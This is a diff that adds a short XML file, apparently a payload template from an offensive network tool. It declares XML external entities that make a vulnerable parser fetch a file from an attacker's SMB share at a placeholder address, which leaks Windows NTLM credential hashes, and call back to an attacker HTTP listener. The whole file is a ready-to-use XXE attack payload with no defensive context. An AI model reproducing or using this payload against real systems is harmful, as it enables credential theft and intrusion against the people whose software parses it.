@@ -1,0 +1,6 @@
+<?xml version="1.0"?>
+<!DOCTYPE data [ 
+<!ENTITY xxe SYSTEM "file://///$smb_server/smb/hash.jpg" >
+<!ENTITY xxe-url SYSTEM "http://$local_ip:$local_port/ssdp/xxe.html" >
+]>
+<data>&xxe;&xxe-url;</data>
